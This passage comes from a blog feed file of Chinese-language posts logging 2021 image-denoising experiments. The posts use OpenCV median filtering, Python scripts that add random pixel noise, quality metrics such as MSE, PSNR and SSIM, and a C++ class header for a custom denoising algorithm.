vifp</span><br></pre></td></tr></table></figure><h6 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h6><p>运用相同的测试图片，可以得到结果：</p><blockquote><p>VIF: 0.9758460769325894</p></blockquote><h5 id="基于结构信息基础"><a href="#基于结构信息基础" class="headerlink" title="基于结构信息基础"></a>基于结构信息基础</h5><ul><li>SSIM：根据图像像素间的相关性构造出参考图像与待评图像之间的结构相似性，SSIM值越大，图像质量越好</li></ul><p>PS：至此，找到更合理的代码方法</p><h6 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import cv2 as cv</span><br><span class="line">import numpy as np</span><br><span class="line">import math</span><br><span class="line">from skimage.metrics import mean_squared_error</span><br><span class="line">from skimage.metrics import peak_signal_noise_ratio</span><br><span class="line">from skimage.metrics import structural_similarity</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 均方误差（MSE）：MSE的值越小，表明图像质量越好</span><br><span class="line">def get_mse(img1, img2):</span><br><span class="line">    return np.mean((img1 / 255. - img2 / 255.) ** 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    origin_img = cv.imread(&#x27;img.png&#x27;, 1)</span><br><span class="line">    new_img = cv.imread(&#x27;denoised_img_noise.png&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    # 均方误差（MSE）：MSE的值越小，表明图像质量越好</span><br><span class="line">    mse = get_mse(origin_img, new_img)</span><br><span class="line">    # 峰值信噪比（PSNR）：PSNR值越大，表明待评图像与参考图像之间的失真较小，图像质量较好</span><br><span class="line">    # 基准为30dB，小于30为劣质</span><br><span class="line">    psnr = peak_signal_noise_ratio(origin_img, new_img)</span><br><span class="line">    # 结构相似度（Structural Similarity,SSIM），SSIM值越大，图像质量越好</span><br><span class="line">    ssim = structural_similarity(origin_img, new_img, multichannel=True)</span><br><span class="line"></span><br><span class="line">    print(&#x27;MSE:&#x27;, mse)</span><br><span class="line">    print(&#x27;PSNR:&#x27;, psnr)</span><br><span class="line">    print(&#x27;SSIM:&#x27;, ssim)</span><br></pre></td></tr></table></figure><h6 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h6><blockquote><p>MSE: 0.0004777804926332579 </p><p>PSNR: 33.20771586094474 </p><p>SSIM: 0.9570612590498769</p></blockquote><h6 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h6><p>我的代码中有这样的一行：<code>from skimage.metrics import mean_squared_error</code></p><p>但是，在下方却没有用到<code>mean_squared_error</code>这一函数，这是因为在测试时，使用<code>mean_squared_error</code>函数得到的结果（30+）与自己写的<code>get_mse</code>函数的结果（0+）大相径庭，而网上的资源大多使用类似于<code>get_mse</code>的方法，而对<code>mean_squared_error</code>方法所提甚少，且从结果看，MSE算法的值也是应该越小越好，所以我暂时不使用<code>mean_squared_error</code>函数</p><h4 id="部分参考"><a href="#部分参考" class="headerlink" title="部分参考"></a>部分参考</h4><blockquote><p>部分参考也成为半参考，它是以理想图像的部分特征信息作为参考，对待评图像进行比较分析，从而得到图像质量评价结果。由于所参考的信息是从图像中提取出来的特征，所以它必须要先提取待评图像和理想图像的部分特征信息，通过比较提取出的部分信息对待评图像进行质量评估。部分参考方法可分为基于原始图像特征方法、基于数字水印方法和基于Wavelet域统计模型的方法等。因为部分参考质量评价依赖于图像的部分特征，与图像整体相比而言，数据量下降了很多，目前应用比较集中在图像传输系统中。</p></blockquote><p>这部分内容暂时也没有头绪，先放过</p><h4 id="无参考"><a href="#无参考" class="headerlink" title="无参考"></a>无参考</h4><blockquote><p>无参考方法也称为首评价方法，因为一般的理想图像很难获得，所以这种完全脱离了对理想参考图像依赖的质量评价方法应用较为广泛。无参考方法一般都是基于图像统计特性。</p></blockquote><ul><li>均值</li><li>标准差</li><li>平均梯度</li><li>熵</li><li>。。。。。。</li></ul><h5 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h5><p>所谓无参考方法，就是只对现有的经过处理的图片进行分析，而不与原图比较。评判方法其实就是是否符合理想图像的特征（与寻找噪声的方式相似：符合噪声特征的像素点就会被判定为噪声）。</p><p>个人认为，这样的方法较为适用于无法得到原图，或者原图存在不可忽略的噪声的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210808</title>
      <link href="/20210808-img-report/"/>
      <url>/20210808-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="降噪后出现边缘“毛刺”问题"><a href="#降噪后出现边缘“毛刺”问题" class="headerlink" title="降噪后出现边缘“毛刺”问题"></a>降噪后出现边缘“毛刺”问题</h2><h3 id="中值滤波"><a href="#中值滤波" class="headerlink" title="中值滤波"></a>中值滤波</h3><p>使用<code>opencv</code>中的<code>medianBlur</code>解决方案：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medianBlur_new_img = cv.medianBlur(new_img, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>可以优化之前的降噪效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040837824.png" alt="image-20210808221052012"></p><p>效果几乎达到理想状态（只有四周边界有些许噪声残留）</p><h3 id="探究中值滤波起了多大作用"><a href="#探究中值滤波起了多大作用" class="headerlink" title="探究中值滤波起了多大作用"></a>探究中值滤波起了多大作用</h3><p>尝试直接使用中值滤波对噪声图进行降噪：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">address</span>):</span></span><br><span class="line">    img = cv.imread(address, <span class="number">1</span>)</span><br><span class="line">    new_img = cv.medianBlur(img, <span class="number">3</span>)</span><br><span class="line">    cv.imwrite(<span class="string">&#x27;denoised_&#x27;</span> + address, new_img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img_address = <span class="string">&#x27;img_noise.png&#x27;</span></span><br><span class="line">    main(img_address)</span><br></pre></td></tr></table></figure><p>得到结果：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040838000.png" alt="denoised_img_noise" style="zoom:150%;" /><p>虽然效果略微比上面差一点，但是几乎接近。</p><p>那么从这个结果看，可以看出中值滤波的算法非常优秀，虽然这无法证明中值滤波在上面试验中起到了多大作用，但也说明了我的方法效果还是欠缺的。</p><h2 id="增加噪声"><a href="#增加噪声" class="headerlink" title="增加噪声"></a>增加噪声</h2><p>将噪声增加到8000个，也就是20%的噪声：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img = cv.imread(<span class="string">&quot;img.png&quot;</span>, <span class="number">1</span>)</span><br><span class="line">(rows, cols, chn) = img.shape</span><br><span class="line">cv.imshow(<span class="string">&quot;img.png&quot;</span>, img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加噪声</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>):</span><br><span class="line">    x = np.random.randint(<span class="number">0</span>, rows)</span><br><span class="line">    y = np.random.randint(<span class="number">0</span>, cols)</span><br><span class="line">    img[x, y, :] = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cv.imshow(<span class="string">&quot;noise&quot;</span>, img)</span><br><span class="line">cv.imwrite(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">cv.waitKey()</span><br><span class="line">cv.destroyAllWindows()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040838830.png" alt="image-20210808222119047"></p><h3 id="中值滤波-1"><a href="#中值滤波-1" class="headerlink" title="中值滤波"></a>中值滤波</h3><p>直接使用中值滤波，得到：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040838624.png" alt="denoised_img_noise" style="zoom:150%;" /><p>这次得到的结果就并不理想了</p><h3 id="我的方法-中值滤波"><a href="#我的方法-中值滤波" class="headerlink" title="我的方法 + 中值滤波"></a>我的方法 + 中值滤波</h3><p>得到：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040838279.png" alt="image-20210808222523752"></p><p>结果优于直接使用中值滤波，在不放大的情况下，肉眼不太看得出噪声，放大之后，发现边缘部分仍有极少量“毛刺”，且边缘界限变得模糊。对于肉眼观察来说，图像变得柔和；对于寻找边缘来说，变得不明确。</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210801</title>
      <link href="/20210801-img-report/"/>
      <url>/20210801-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="增加噪声"><a href="#增加噪声" class="headerlink" title="增加噪声"></a>增加噪声</h2><p>将噪声个数增加到10%（实验中具体为4000个）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img = cv.imread(<span class="string">&quot;img.png&quot;</span>, <span class="number">1</span>)</span><br><span class="line">(rows, cols, chn) = img.shape</span><br><span class="line">cv.imshow(<span class="string">&quot;img.png&quot;</span>, img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加噪声</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):</span><br><span class="line">    x = np.random.randint(<span class="number">0</span>, rows)</span><br><span class="line">    y = np.random.randint(<span class="number">0</span>, cols)</span><br><span class="line">    img[x, y, :] = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cv.imshow(<span class="string">&quot;noise&quot;</span>, img)</span><br><span class="line">cv.imwrite(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">cv.waitKey()</span><br><span class="line">cv.destroyAllWindows()</span><br></pre></td></tr></table></figure><p>得到：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040833917.png" alt="img_noise" style="zoom:150%;" /><h2 id="降噪"><a href="#降噪" class="headerlink" title="降噪"></a>降噪</h2><h3 id="降噪结果"><a href="#降噪结果" class="headerlink" title="降噪结果"></a>降噪结果</h3><p>用上周的方法尝试，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040833000.png" alt="image-20210801205556327"></p><p>可以看到结果中仍然有部分噪声未被清除</p><h3 id="合理性"><a href="#合理性" class="headerlink" title="合理性"></a>合理性</h3><h4 id="区分度"><a href="#区分度" class="headerlink" title="区分度"></a>区分度</h4><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040834254.png" alt="Figure_1"></p><h4 id="差异度"><a href="#差异度" class="headerlink" title="差异度"></a>差异度</h4><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040834700.png" alt="2"></p><h3 id="再次处理"><a href="#再次处理" class="headerlink" title="再次处理"></a>再次处理</h3><p>调整参数，且再次处理，得到：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111040834579.png" alt="image-20210802134805804"></p><p>可以看到，“内部”的噪声去除，只剩下，图像边界（四周）和图像边缘残留部分噪声（呈毛刺状，且在原图大小时，噪声不明显）</p><h2 id="尝试批量处理"><a href="#尝试批量处理" class="headerlink" title="尝试批量处理"></a>尝试批量处理</h2><p>在测试中，发现：速度上基本不能满足测试的要求</p><p>可能原因：</p><ul><li>常见的图片（一般为现在的普通手机的照片）像素较高，基本远大于测试用图（200*200）</li><li>程序步骤多（包含读入、检测噪声、清除噪声、写入、检测区分度、检测差异度）</li></ul><p>所以程序仍需改进</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210725</title>
      <link href="/20210725-img-report/"/>
      <url>/20210725-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="优化算法"><a href="#优化算法" class="headerlink" title="优化算法"></a>优化算法</h2><h3 id="程序结构合理性与时间复杂度"><a href="#程序结构合理性与时间复杂度" class="headerlink" title="程序结构合理性与时间复杂度"></a>程序结构合理性与时间复杂度</h3><p>机械地将denoise12和denoise7合并在一起，虽然达到了效果，但是程序结构上显然不合理，时间复杂度也大大加重。</p><h4 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h4><p>因为两种降噪算法在大部分的操作上是相似的，甚至是相同的，那么很简单地想到将其有机复合，简而言之就是精简相同或类似的步骤，并将关键处理步骤穿插在一起。</p><p>这样的方法很容易想到，但是修改起来费时费力，容易出bug。因为一开始编写程序时，由于没有全面学透python的原因，没有使用面向对象的思想，而是简单使用了面向过程的写法，尽管使用了结构体的思想，但程序看起来还是不够有条理，而且后期难以管理。</p><p>所以我尝试使用C++给出更好的解决方案（<code>CPicture.h</code>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;opencv2/opencv.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPicture</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">string address;                      <span class="comment">//图像地址</span></span><br><span class="line">Mat img;                             <span class="comment">//图像Mat</span></span><br><span class="line">vector&lt;Mat&gt; channels;                <span class="comment">//BGR通道</span></span><br><span class="line">vector&lt;vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&gt; noises;  <span class="comment">//BGR噪声</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="built_in">CPicture</span>();</span><br><span class="line"><span class="comment">//含参构造</span></span><br><span class="line"><span class="built_in">CPicture</span>(string&amp; str, <span class="keyword">int</span> k);</span><br><span class="line"><span class="comment">//去噪函数</span></span><br><span class="line"><span class="function">Mat <span class="title">denoise</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> m_k = <span class="number">1</span>;                         <span class="comment">//多尺度指数</span></span><br><span class="line"><span class="keyword">int</span> m_threshold = <span class="number">1</span>;                 <span class="comment">//阈值</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="comment">//噪声检测</span></span><br><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">noise_check</span>(Mat&amp; channel);</span><br><span class="line"><span class="comment">//不考虑位置d7</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">division71</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; ary)</span></span>;</span><br><span class="line"><span class="comment">//考虑位置d7</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">division72</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; ary)</span></span>;</span><br><span class="line"><span class="comment">//处理特殊值</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">special_check</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; ary)</span></span>;</span><br><span class="line"><span class="comment">//一维到二维</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">oned2twod</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="comment">//缩小图像</span></span><br><span class="line">vector&lt;vector&lt;Mat&gt;&gt; <span class="built_in">shrink</span>(Mat&amp; channel);</span><br><span class="line"><span class="comment">//搜索最佳可赋值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_best</span><span class="params">(Mat&amp; channel, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; noise, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="发现算法本身存在的问题"><a href="#发现算法本身存在的问题" class="headerlink" title="发现算法本身存在的问题"></a>发现算法本身存在的问题</h3><p>“找不出来，再找一遍”的方法本身就已经是下策了，如果能从根本上解决问题，自然是最好。</p><p>下面是考虑位置的划分方法的判断区分度部分的代码片段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># 判断区分度</span></span><br><span class="line">max1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">    max1 = p[i]</span><br><span class="line">min2 = <span class="number">255</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">    min2 = p[i]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(max1 - min2) &lt; <span class="number">10</span>:</span><br><span class="line"><span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>这已经是修改过的代码，原本的<code>min2</code>的初始值会使算法不合理。</p><p>但是由于<code>CvMat</code>中的值的数据类型较为特殊（为<code>uchar</code>），会使得<code>max1-min2</code>溢出数据范围，导致判断区分度部分异常，从而噪声检测无法进行。</p><p>那么，索性进行不判断区分度的尝试。因为单纯从该部分来看，这只会导致本不是噪声点却被修改的可能性上升，但是修改值却不可能会是噪声，所以猜测影响应该不大。</p><p>再进一步思考，其实考虑位置的区分度算法虽然与不考虑位置的区分度算法有所差异，但是效果应该是近似的，所以，对于同一块区域来说，不考虑位置的区分度结果完全可以共享给关于该块区域的所有算法。</p><p>另外，还调整了一些不合理的参数、阈值。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032003997.png" alt="image-20210725225144442"></p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span 